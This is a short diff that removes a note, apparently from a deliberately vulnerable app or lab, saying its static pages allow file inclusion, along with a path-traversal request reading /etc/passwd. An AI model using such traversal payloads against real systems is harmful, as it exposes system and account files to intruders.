@@ -1,3 +1,0 @@
-All of the static pages are vulnerable to file inclusion.
-
-/statics?page=../../../../../../etc/passwd
